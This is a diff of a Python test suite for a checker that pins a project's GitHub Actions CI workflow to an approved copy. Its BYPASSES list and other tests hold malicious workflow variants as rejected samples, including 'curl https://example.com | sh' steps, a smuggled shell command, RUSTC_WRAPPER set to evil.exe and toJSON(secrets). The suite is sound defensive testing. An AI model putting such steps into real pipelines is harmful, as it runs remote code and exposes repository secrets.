@@ -1,25 +1,27 @@
-"""Tests for scripts/check_ci_workflow.py, run on good and bad sample workflows (written under the project's scratch folder,
-removed afterwards) and on the real workflow and doc.
+"""Tests for scripts/check_ci_workflow.py: the workflow must equal the approved copy (CRLF -> LF only), and the approved
+copy must pass its own self-test. CLI tests write sample files under the scratch folder that broadsword.toml names
+(scratch_dir), removed afterwards.
 
   python -I -B scripts/test_check_ci_workflow.py -v
 
-BS_CI_CHECK_SCRIPT=<path> runs the same tests against another copy of the script (used to prove the tests can fail).
+BYPASSES is every workflow the review rounds showed passing an earlier (YAML-parsing) checker; each must fail here.
 """
 import sys
 
 sys.dont_write_bytecode = True
 
+import contextlib
 import importlib.util
-import os
+import io
 import pathlib
 import shutil
+import tomllib
 import unittest
 import uuid
 
 HERE = pathlib.Path(__file__).resolve().parent
 ROOT = HERE.parent
-SCRIPT = pathlib.Path(os.environ.get("BS_CI_CHECK_SCRIPT") or HERE / "check_ci_workflow.py")
-SCRATCH = ROOT / "scratch"
+SCRIPT = HERE / "check_ci_workflow.py"
 
 spec = importlib.util.spec_from_file_location("check_ci_workflow", SCRIPT)
 mod = importlib.util.module_from_spec(spec)
@@ -27,16 +29,18 @@ spec.loader.exec_module(mod)
 
 SHA = "11bd71901bbe5b1630ceea73d27597364c9af683"
 
-DOC = """# Node 0.1
+DOC = f"""# Node 0.1
 
 - ci-triggers: push, pull_request
 - ci-runner: windows-latest
 - ci-build: cargo build --locked -p broadsword
 - ci-test: cargo test --locked -p broadsword
-- ci-checkout: actions/checkout pinned to a 40-character commit SHA
+- ci-checkout: actions/checkout@{SHA}
 """
 
-GOOD = f"""# comment
+# An independent copy of the approved workflow (written here, not taken from the module).
+GOOD = f"""# CI for the Broadsword crate (roadmap node 0.1). scripts/check_ci_workflow.py checks this file against docs/nodes/0.1.md.
+# No secrets, no deploy steps; the only third-party action is actions/checkout, pinned to a full commit SHA.
 name: ci
 
 on:
@@ -57,242 +61,218 @@ jobs:
         run: cargo test --locked -p broadsword
 """
 
+TEST_STEP = "      - name: Test\n        run: cargo test --locked -p broadsword\n"
+RUN_TEST = "run: cargo test --locked -p broadsword"
 
-def problems(text, doc=DOC):
-    return mod.check(text, mod.read_contract(doc))
-
-
-class Check(unittest.TestCase):
-    def test_good_file_is_ok(self):
-        self.assertEqual(problems(GOOD), [])
-
-    def test_missing_pull_request_trigger(self):
-        p = problems(GOOD.replace("  pull_request:\n", ""))
-        self.assertTrue(any("triggers are" in x for x in p), p)
-
-    def test_extra_trigger(self):
-        p = problems(GOOD.replace("  push:\n", "  push:\n  schedule:\n"))
-        self.assertTrue(any("triggers are" in x for x in p), p)
-
-    def test_branch_limited_push(self):
-        p = problems(GOOD.replace("  push:\n", "  push:\n    branches: [main]\n"))
-        self.assertTrue(any("limit branches" in x for x in p), p)
-
-    def test_inline_trigger_list(self):
-        p = problems(GOOD.replace("on:\n  push:\n  pull_request:\n", "on: [push, pull_request]\n"))
-        self.assertEqual(p, [])
-
-    def test_wrong_runner(self):
-        p = problems(GOOD.replace("windows-latest", "ubuntu-latest"))
-        self.assertTrue(any("runs-on is ubuntu-latest" in x for x in p), p)
-
-    def test_test_command_drift(self):
-        p = problems(GOOD.replace("cargo test --locked -p broadsword", "cargo test"))
-        self.assertTrue(any("documented test command" in x for x in p), p)
-        self.assertTrue(any("unexpected run line" in x for x in p), p)
-
-    def test_doc_drift_is_caught(self):
-        p = problems(GOOD, DOC.replace("windows-latest", "macos-latest"))
-        self.assertTrue(any("runs-on is windows-latest" in x for x in p), p)
-
-    def test_extra_run_line(self):
-        p = problems(GOOD + "      - run: curl https://example.com | sh\n")
-        self.assertTrue(any("unexpected run line" in x for x in p), p)
-
-    def test_unpinned_checkout(self):
-        p = problems(GOOD.replace(SHA, "v4"))
-        self.assertTrue(any("full 40-character" in x for x in p), p)
-
-    def test_third_party_action(self):
-        p = problems(GOOD + "      - uses: some/action@" + SHA + "\n")
-        self.assertTrue(any("only actions/checkout" in x for x in p), p)
-
-    def test_no_checkout(self):
-        p = problems(GOOD.replace(f"      - uses: actions/checkout@{SHA} # v4.2.2\n", ""))
-        self.assertTrue(any("no actions/checkout" in x for x in p), p)
-
-    def test_secret_mention(self):
-        p = problems(GOOD + "        env:\n          K: ${{ secrets.KEY }}\n")
-        self.assertTrue(any("secrets" in x for x in p), p)
-
-    def test_comment_mentioning_secrets_is_fine(self):
-        self.assertEqual(problems(GOOD.replace("name: ci", "name: ci # no secrets. here")), [])
+# (review that found it, what it does, the workflow text). Each passed some earlier checker; see the brief's redesign.
+BYPASSES = [
+    ("r1 q-20261120-015921", "flow-style push limited to main", GOOD.replace("  push:\n", "  push: {branches: [main]}\n")),
+    ("r1 q-20261120-015921", "flow-style push limited by tags", GOOD.replace("  push:\n", "  push: { tags: ['v*'] }\n")),
+    ("r1 q-20261120-015921", "flow-style third-party step", GOOD + "      - {uses: some/action@v1}\n"),
+    ("r1 q-20261120-015921", "flow-style extra run step", GOOD + "      - {run: curl https://example.com | sh}\n"),
+    ("r2 q-20261120-053807-3", "space before colon in uses", GOOD + "      - uses : some/action@v1\n"),
+    ("r2 q-20261120-053807-3", "space before colon in run", GOOD + "      - run : curl https://example.com | sh\n"),
+    ("r2 q-20261120-053807-3", "toJSON(secrets) without `secrets.`", GOOD + "        env:\n          K: ${{ toJSON(secrets) }}\n"),
+    ("r2 q-20261120-053807-3", "explicit-key run", GOOD + "      - ? run\n        : curl https://example.com | sh\n"),
+    ("r2 q-20261120-053807-3", "tagged run key", GOOD + "      - !!str run: curl https://example.com | sh\n"),
+    ("r3 q-20261120-054509", "quoted run continues onto next line",
+     GOOD.replace(RUN_TEST, 'run: "cargo test --locked -p broadsword\n          zz: x"')),
+    ("r3 q-20261120-054509", "quoted run continuation runs a command",
+     GOOD.replace(RUN_TEST, 'run: "cargo test --locked -p broadsword\n          ok: ; curl https://example.com | sh"')),
+    ("r3 q-20261120-054509", "custom shell template", GOOD + "        shell: bash -c 'curl https://example.com | sh; {0}'\n"),
+    ("r3 q-20261120-054509", "env RUSTC_WRAPPER", GOOD + "        env:\n          RUSTC_WRAPPER: evil.exe\n"),
+    ("r3 q-20261120-054509", "working-directory", GOOD + "        working-directory: elsewhere\n"),
+    ("r3 q-20261120-054509", "job container",
+     GOOD.replace("    runs-on: windows-latest\n", "    runs-on: windows-latest\n    container: some/image\n")),
+    ("r4 q-20261120-063309", "block-scalar name, run continuation folds in a curl",
+     GOOD.replace(TEST_STEP, "      - name: |\n          Test\n        run: cargo test --locked -p broadsword\n"
+                             "          ; curl https://example.com/x | sh\n")),
+    ("r4 q-20261120-063309", "pull_request types: closed",
+     GOOD.replace("  pull_request:\n", "  pull_request:\n    types:\n      - closed\n")),
+    ("r4 q-20261120-063309", "job if: false", GOOD.replace("    runs-on:", "    if: false\n    runs-on:")),
+    ("r4 q-20261120-063309", "continue-on-error on the test step", GOOD + "        continue-on-error: true\n"),
+    ("r4 q-20261120-063309", "nested `- - run:` item", GOOD + "      - - run: curl https://example.com | sh\n"),
+]
 
 
-    # fail-closed forms the line-based checker cannot read (each must be refused)
-    def refused(self, text, word):
-        p = problems(text)
+def b(text):
+    return text.encode("utf-8")
+
+
+def scratch_dir():
+    with open(ROOT / "broadsword.toml", "rb") as f:
+        return ROOT / tomllib.load(f)["scratch_dir"]
+
+
+class Pin(unittest.TestCase):
+    def test_identical_file_passes(self):
+        self.assertEqual(mod.check(b(GOOD)), [])
+
+    def test_module_pin_equals_independent_copy(self):
+        self.assertEqual(mod.APPROVED, GOOD)
+
+    def test_crlf_only_difference_passes(self):
+        self.assertEqual(mod.check(b(GOOD.replace("\n", "\r\n"))), [])
+
+    def test_mixed_crlf_and_lf_passes(self):
+        lines = GOOD.splitlines(keepends=True)
+        mixed = "".join(l.replace("\n", "\r\n") if i % 2 else l for i, l in enumerate(lines))
+        self.assertIn("\r\n", mixed)
+        self.assertEqual(mod.check(b(mixed)), [])
+
+    def test_one_byte_change_fails(self):
+        p = mod.check(b(GOOD.replace("windows-latest", "windows-latesu")))
+        self.assertIn(mod.CHANGED, p)
+
+    def test_every_single_byte_change_fails(self):
+        base = b(GOOD)
+        for i in range(len(base)):
+            changed = bytearray(base)
+            changed[i] ^= 1
+            self.assertNotEqual(mod.check(bytes(changed)), [], f"byte {i} flipped still passes")
+
+    def test_every_single_byte_deletion_fails(self):
+        base = b(GOOD)
+        for i in range(len(base)):
+            self.assertNotEqual(mod.check(base[:i] + base[i + 1:]), [], f"byte {i} deleted still passes")
+
+    def test_only_crlf_is_normalised(self):
+        for name, data in [("lone CR", b(GOOD.replace("\n", "\r", 1))), ("BOM", b"\xef\xbb\xbf" + b(GOOD)),
+                           ("no final newline", b(GOOD[:-1])), ("trailing space", b(GOOD.replace("ci\n", "ci \n", 1))),
+                           ("tab", b(GOOD.replace("  push:", "\tpush:"))), ("extra blank line", b(GOOD + "\n")),
+                           ("CR CR LF", b(GOOD.replace("\n", "\r\r\n", 1))), ("not UTF-8", b(GOOD) + b"\xff")]:
+            self.assertIn(mod.CHANGED, mod.check(data), name)
+
+    def test_failure_prints_a_unified_diff(self):
+        p = mod.check(b(GOOD.replace("windows-latest", "ubuntu-latest")))
+        self.assertTrue(any(x.startswith("--- approved") for x in p), p)
+        self.assertTrue(any(x.startswith("+++ .github/workflows/ci.yml") for x in p), p)
+        self.assertIn("-    runs-on: windows-latest", p)
+        self.assertIn("+    runs-on: ubuntu-latest", p)
+        self.assertEqual(p[-1], "ci.yml changed: review the diff, then update the approved copy in the same commit")
+
+
+class Bypasses(unittest.TestCase):
+    def test_every_earlier_bypass_fails(self):
+        self.assertEqual(len(BYPASSES), 20)
+        for review, what, text in BYPASSES:
+            with self.subTest(review=review, what=what):
+                self.assertNotEqual(text, GOOD)
+                self.assertIn(mod.CHANGED, mod.check(b(text)))
+                self.assertIn(mod.CHANGED, mod.check(b(text.replace("\n", "\r\n"))))
+
+
+class SelfTest(unittest.TestCase):
+    """pin_problems() on the approved copy, and on planted bad copies (so changing the pin stays deliberate)."""
+
+    def contract(self, doc=DOC):
+        return mod.read_contract(doc)
+
+    def test_approved_copy_passes_its_self_test(self):
+        self.assertEqual(mod.pin_problems(mod.APPROVED, self.contract()), [])
+
+    def test_every_bypass_as_approved_copy_fails_the_self_test(self):
+        for review, what, text in BYPASSES:
+            with self.subTest(review=review, what=what):
+                self.assertNotEqual(mod.pin_problems(text, self.contract()), [])
+
+    def planted(self, text, word):
+        p = mod.pin_problems(text, self.contract())
         self.assertTrue(any(word in x for x in p), p)
 
-    def test_flow_push_with_branches(self):
-        self.refused(GOOD.replace("  push:\n", "  push: {branches: [main]}\n"), "flow-style")
+    def test_planted_extra_trigger(self):
+        self.planted(GOOD.replace("  pull_request:\n", "  pull_request:\n  schedule:\n"), "triggers")
 
-    def test_flow_push_with_tags(self):
-        self.refused(GOOD.replace("  push:\n", "  push: { tags: ['v*'] }\n"), "flow-style")
+    def test_planted_missing_trigger(self):
+        self.planted(GOOD.replace("  pull_request:\n", ""), "triggers")
 
-    def test_flow_empty_push(self):
-        self.refused(GOOD.replace("  push:\n", "  push: {}\n"), "flow-style")
+    def test_planted_branch_filter(self):
+        self.planted(GOOD.replace("  push:\n", "  push:\n    branches:\n      - main\n"), "triggers")
 
-    def test_flow_list_under_push(self):
-        self.refused(GOOD.replace("  push:\n", "  push:\n    branches: [main]\n"), "flow-style")
+    def test_planted_runner(self):
+        self.planted(GOOD.replace("windows-latest", "ubuntu-latest"), "runs-on")
 
-    def test_whole_on_as_flow_mapping(self):
-        self.refused(GOOD.replace("on:\n  push:\n  pull_request:\n", "on: {push: {branches: [main]}, pull_request: {}}\n"), "flow-style `on:`")
+    def test_planted_test_command(self):
+        self.planted(GOOD.replace(RUN_TEST, "run: cargo test"), "cargo test --locked -p broadsword")
 
-    def test_on_child_line_is_flow_mapping(self):
-        self.refused(GOOD.replace("  push:\n  pull_request:\n", "  {push: {branches: [main]}}\n"), "flow-style")
+    def test_planted_extra_run(self):
+        self.planted(GOOD + "      - run: echo hi\n", "`run:` other than")
 
-    def test_inline_list_with_nested_brackets(self):
-        self.refused(GOOD.replace("on:\n  push:\n  pull_request:\n", "on: [push, {pull_request: {branches: [main]}}]\n"), "flow-style `on:`")
+    def test_planted_other_action(self):
+        self.planted(GOOD + "      - uses: some/action@" + SHA + "\n", "the only `uses:`")
 
-    def test_inline_flat_list_allowed(self):
-        self.assertEqual(problems(GOOD.replace("on:\n  push:\n  pull_request:\n", "on: [push, pull_request] # ok\n")), [])
+    def test_planted_unpinned_checkout(self):
+        self.planted(GOOD.replace("@" + SHA, "@v4"), "the only `uses:`")
 
-    def test_anchor(self):
-        self.refused(GOOD.replace("  push:\n", "  push: &p\n"), "anchor or alias")
+    def test_planted_forbidden_keys(self):
+        for key in ("if: false", "continue-on-error: true", "shell: bash", "working-directory: x", "env:"):
+            with self.subTest(key=key):
+                self.planted(GOOD + f"        {key}\n", "contains")
 
-    def test_alias(self):
-        self.refused(GOOD.replace("  pull_request:\n", "  pull_request: *p\n"), "anchor or alias")
-
-    def test_alias_on_a_line_with_an_expression(self):
-        self.refused(GOOD + "        env: ${{ github.sha }} *p\n", "anchor or alias")
-
-    def test_merge_key(self):
-        self.refused(GOOD + "      - <<: *base\n", "merge key")
-
-    def test_multi_document(self):
-        self.refused(GOOD + "---\nname: second\non:\n  push:\n    branches: [x]\n", "document marker")
-
-    def test_leading_document_marker(self):
-        self.refused("---\n" + GOOD, "document marker")
-
-    def test_document_end_marker(self):
-        self.refused(GOOD + "...\n", "document marker")
-
-    def test_two_on_keys(self):
-        self.refused(GOOD + "on:\n  push:\n", "top-level `on:` keys")
-
-    def test_flow_style_step_uses(self):
-        self.refused(GOOD + "      - {uses: some/action@v1}\n", "flow-style")
-
-    def test_flow_style_step_run(self):
-        self.refused(GOOD + "      - {run: curl https://example.com | sh}\n", "flow-style")
-
-    def test_flow_style_steps_value(self):
-        self.refused(GOOD.replace("    steps:\n", "    steps: [{run: id}]\n"), "flow-style")
-
-    def test_quoted_key_run(self):
-        self.refused(GOOD + "      - \"run\": curl https://example.com | sh\n", "quoted YAML key")
-
-    def test_space_before_colon_uses(self):
-        self.refused(GOOD + "      - uses : some/action@v1\n", "only actions/checkout is allowed")
-
-    def test_space_before_colon_run(self):
-        self.refused(GOOD + "      - run : curl https://example.com | sh\n", "unexpected run line")
-
-    def test_space_before_colon_runs_on(self):
-        self.refused(GOOD.replace("runs-on: windows-latest", "runs-on : ubuntu-latest"), "runs-on is")
-
-    def test_space_before_colon_on_trigger(self):
-        self.refused(GOOD.replace("  pull_request:\n", "  pull_request :\n  schedule :\n"), "triggers are")
-
-    def test_space_before_colon_branches_filter(self):
-        self.refused(GOOD.replace("  push:\n", "  push:\n    branches : [main]\n"), "limit branches")
-
-    def test_quoted_key_uses_double(self):
-        self.refused(GOOD + "      - \"uses\": some/action@v1\n", "quoted YAML key")
-
-    def test_quoted_key_run_single(self):
-        self.refused(GOOD + "      - 'run': curl https://example.com | sh\n", "quoted YAML key")
-
-    def test_quoted_key_with_space_before_colon(self):
-        self.refused(GOOD + "      - \"uses\" : some/action@v1\n", "quoted YAML key")
-
-    def test_flow_mapping_step_with_space(self):
-        self.refused(GOOD + "      - { uses : some/action@v1 }\n", "flow-style")
-
-    def test_explicit_key_form(self):
-        self.refused(GOOD + "      - ? run\n        : curl https://example.com | sh\n", "unrecognised form")
-
-    def test_tagged_key(self):
-        self.refused(GOOD + "      - !!str run: curl https://example.com | sh\n", "unrecognised form")
-
-    def test_unclassifiable_line_in_steps(self):
-        self.refused(GOOD + "      - just a bare scalar step\n", "unrecognised form")
-
-    def test_unclassifiable_continuation_in_steps(self):
-        self.refused(GOOD + "        stray words without a key\n", "unrecognised form")
-
-    def test_block_scalar_body_in_steps_is_not_refused(self):
-        ok = GOOD.replace("        run: cargo test --locked -p broadsword\n",
-                          "        run: cargo test --locked -p broadsword\n      - name: |\n          words: with a colon\n          and a bare line\n        env:\n          K: v\n")
-        self.assertIn("name: |", ok)
-        self.assertFalse(any("unrecognised form" in x for x in problems(ok)), problems(ok))
-
-    def test_quoted_run_continues_onto_next_line_double(self):
-        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", 'run: "cargo test --locked -p broadsword\n          zz: x"'), "unrecognised form")
-
-    def test_quoted_run_continuation_runs_extra_command(self):
-        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", 'run: "cargo test --locked -p broadsword\n          ok: ; curl https://example.com | sh"'), "unrecognised form")
-
-    def test_quoted_run_continues_onto_next_line_single(self):
-        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", "run: 'cargo test --locked -p broadsword\n          zz: x'"), "unrecognised form")
-
-    def test_plain_run_continuation_inside_steps(self):
-        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", "run: cargo test --locked -p broadsword\n          zz: x"), "unrecognised form")
-
-    def test_quoted_scalar_closed_on_its_own_line_is_fine(self):
-        ok = GOOD.replace("      - name: Build\n", '      - name: "Build \\" it"\n').replace("      - name: Test\n", "      - name: 'It''s a test'\n")
-        self.assertIn("It''s", ok)
-        self.assertEqual(problems(ok), [])
-
-    def test_expression_braces_are_not_flow(self):
-        self.assertEqual(problems(GOOD.replace("        run: cargo build", "        env:\n          K: ${{ github.sha }}\n        run: cargo build")), [])
-
-    def test_paths_filter_refused(self):
-        p = problems(GOOD.replace("  pull_request:\n", "  pull_request:\n    paths:\n      - src/**\n"))
-        self.assertTrue(any("limit branches, tags or paths" in x for x in p), p)
+    def test_doc_drift_fails_the_self_test(self):
+        for key, value in [("runner", "macos-latest"), ("build", "cargo build"), ("test", "cargo test"),
+                           ("triggers", "push"), ("checkout", "actions/checkout@v4")]:
+            with self.subTest(key=key):
+                doc = "\n".join(f"- ci-{key}: {value}" if l.startswith(f"- ci-{key}:") else l for l in DOC.splitlines())
+                p = mod.pin_problems(mod.APPROVED, self.contract(doc))
+                self.assertTrue(any(f"ci-{key}" in x for x in p), p)
 
 
 class Cli(unittest.TestCase):
     def setUp(self):
-        SCRATCH.mkdir(exist_ok=True)
-        self.dir = SCRATCH / f"ci-check-test-{uuid.uuid4().hex[:8]}"
+        s = scratch_dir()
+        s.mkdir(exist_ok=True)
+        self.dir = s / f"ci-check-test-{uuid.uuid4().hex[:8]}"
         self.dir.mkdir()
         self.addCleanup(shutil.rmtree, self.dir, True)
 
     def run_main(self, workflow, doc):
         w, d = self.dir / "ci.yml", self.dir / "0.1.md"
         if workflow is not None:
-            w.write_text(workflow, encoding="utf-8")
+            w.write_bytes(workflow)
         if doc is not None:
             d.write_text(doc, encoding="utf-8")
         old = sys.argv
         sys.argv = ["check_ci_workflow.py", "--workflow", str(w), "--doc", str(d)]
+        out = io.StringIO()
         try:
-            return mod.main()
+            with contextlib.redirect_stdout(out):
+                rc = mod.main()
         finally:
             sys.argv = old
+        return rc, out.getvalue()
 
     def test_good_exits_0(self):
-        self.assertEqual(self.run_main(GOOD, DOC), 0)
+        self.assertEqual(self.run_main(b(GOOD), DOC), (0, "ci workflow: OK\n"))
 
-    def test_bad_exits_1(self):
-        self.assertEqual(self.run_main(GOOD.replace("windows-latest", "ubuntu-latest"), DOC), 1)
+    def test_good_crlf_exits_0(self):
+        self.assertEqual(self.run_main(b(GOOD.replace("\n", "\r\n")), DOC)[0], 0)
+
+    def test_bad_exits_1_with_diff_and_line(self):
+        rc, out = self.run_main(b(GOOD.replace("windows-latest", "ubuntu-latest")), DOC)
+        self.assertEqual(rc, 1)
+        self.assertIn("+    runs-on: ubuntu-latest\n", out)
+        self.assertIn("ci.yml changed: review the diff, then update the approved copy in the same commit\n", out)
+
+    def test_doc_drift_exits_1(self):
+        rc, out = self.run_main(b(GOOD), DOC.replace("windows-latest", "macos-latest"))
+        self.assertEqual(rc, 1)
+        self.assertIn("ci-runner", out)
 
     def test_missing_file_exits_2(self):
-        self.assertEqual(self.run_main(None, DOC), 2)
+        self.assertEqual(self.run_main(None, DOC)[0], 2)
 
     def test_doc_without_contract_exits_2(self):
-        self.assertEqual(self.run_main(GOOD, "# nothing\n"), 2)
+        self.assertEqual(self.run_main(b(GOOD), "# nothing\n")[0], 2)
 
 
 class RealFiles(unittest.TestCase):
-    def test_real_workflow_matches_real_doc(self):
+    def test_real_workflow_is_the_approved_copy(self):
         w = ROOT / ".github" / "workflows" / "ci.yml"
         d = ROOT / "docs" / "nodes" / "0.1.md"
         self.assertTrue(w.is_file() and d.is_file())
-        self.assertEqual(mod.check(w.read_text(encoding="utf-8"), mod.read_contract(d.read_text(encoding="utf-8"))), [])
+        self.assertEqual(mod.pin_problems(mod.APPROVED, mod.read_contract(d.read_text(encoding="utf-8"))), [])
+        self.assertEqual(mod.check(w.read_bytes()), [])
 
 
 if __name__ == "__main__":
